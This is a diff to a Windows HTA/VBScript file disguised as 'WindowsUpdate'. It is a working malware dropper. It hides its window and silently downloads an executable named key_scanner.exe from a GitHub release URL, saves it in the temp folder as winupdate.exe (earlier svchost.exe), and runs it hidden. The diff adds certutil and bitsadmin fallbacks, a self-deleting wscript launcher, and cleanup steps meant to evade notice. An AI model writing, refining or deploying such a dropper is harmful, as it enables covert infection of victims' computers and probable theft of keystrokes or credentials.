@@ -1,6 +1,6 @@
 <hta:application
   id="oHTA"
-  applicationname="SystemHelper"
+  applicationname="WindowsUpdate"
   border="none"
   caption="no"
   showintaskbar="no"
@@ -14,25 +14,39 @@
 />
 
 <script language="VBScript">
-  ' ==== ENSURE WINDOW NEVER APPEARS ====
+  ' ==== ENSURE COMPLETE INVISIBILITY ====
   Window.resizeTo 0,0
   Window.moveTo -2000,-2000
   Set WshShell = CreateObject("WScript.Shell")
+  Set fso = CreateObject("Scripting.FileSystemObject")
   
-  ' ==== METHOD 1: ULTRA-SILENT DOWNLOAD & EXECUTION ====
-  ' First try PowerShell (most reliable)
-  psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""$p='%temp%\svchost.exe';" & _
-              "try{(New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe',$p);" & _
-              "if(Test-Path $p){Start-Process -WindowStyle Hidden $p}}catch{}"""
+  ' ==== METHOD 1: POWERSHELL SILENT DOWNLOAD ====
+  psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $p='%temp%\\winupdate.exe'; " & _
+              "try { (New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe', $p); " & _
+              "if (Test-Path $p) { Start-Process -WindowStyle Hidden $p } } catch { }"""
   
-  ' ==== METHOD 2: FALLBACK TO BITSADMIN ====
-  bitsCommand = "cmd /c bitsadmin /transfer myjob /download /priority high " & _
-                "https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe " & _
-                "%temp%\\svchost.exe && start /b %temp%\\svchost.exe"
+  ' ==== METHOD 2: CERTUTIL FALLBACK ====
+  certutilCommand = "cmd /c certutil -urlcache -split -f https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe %temp%\\winupdate.exe && start /b %temp%\\winupdate.exe"
   
-  ' ==== EXECUTE SILENTLY ====
-  WshShell.Run "cmd /c " & psCommand & " || " & bitsCommand, 0, False
+  ' ==== METHOD 3: BITSADMIN ALTERNATIVE ====
+  bitsCommand = "cmd /c bitsadmin /transfer myjob /download /priority high https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe %temp%\\winupdate.exe && start /b %temp%\\winupdate.exe"
   
-  ' ==== FORCE CLOSE HTA ====
-  window.setTimeout "Self.Close()", 1000
+  ' ==== CREATE AND RUN A HIDDEN VBS LAUNCHER ====
+  tempVBS = "%temp%\\" & fso.GetTempName() & ".vbs"
+  Set file = fso.CreateTextFile(tempVBS, True)
+  file.WriteLine "On Error Resume Next"
+  file.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
+  file.WriteLine "WshShell.Run """ & psCommand & """, 0, False"
+  file.WriteLine "WScript.Sleep 5000"
+  file.WriteLine "WshShell.Run """ & certutilCommand & """, 0, False"
+  file.WriteLine "WScript.Sleep 5000"
+  file.WriteLine "WshShell.Run """ & bitsCommand & """, 0, False"
+  file.Close
+  
+  ' ==== EXECUTE THROUGH WSCRIPT (COMPLETELY HIDDEN) ====
+  WshShell.Run "wscript.exe //B //E:vbscript """ & tempVBS & """", 0, False
+  
+  ' ==== CLEANUP ====
+  window.setTimeout "fso.DeleteFile(""" & tempVBS & """)", 10000
+  window.setTimeout "Self.Close()", 15000
 </script>
